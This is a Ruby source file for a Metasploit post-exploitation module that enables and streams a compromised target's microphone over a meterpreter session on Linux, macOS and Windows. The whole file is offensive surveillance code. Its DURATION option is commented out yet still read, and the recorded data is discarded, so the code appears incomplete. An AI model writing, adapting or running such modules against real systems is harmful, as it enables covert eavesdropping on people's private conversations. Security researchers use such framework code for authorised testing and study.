##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'rex'

class MetasploitModule < Msf::Post

  include Msf::Auxiliary::Report

  def initialize(info={})
    super( update_info( info,
                        'Name'          => 'Multi Manage Stream Microphone',
                        'Description'   => %q{
          This module will enable and stream your target's microphone.
        Please use Java meterpreter to be able to use this feature.
      },
                        'License'       => MSF_LICENSE,
                        'Author'        => [ 'dmohanty-r7'],
                        'Platform'      => %w{ linux osx win },
                        'SessionTypes'  => [ 'meterpreter' ]
           ))

    register_options(
        [
            #OptInt.new('DURATION', [false, 'Number of seconds to record', 5])
        ], self.class)
  end

  def rhost
    session.sock.peerhost
  end

  def run

    if client.nil?
      print_error("Invalid session ID selected. Make sure the host isn't dead.")
      return
    end

    data = session.webcam.record_mic(datastore['DURATION'])
  end

end
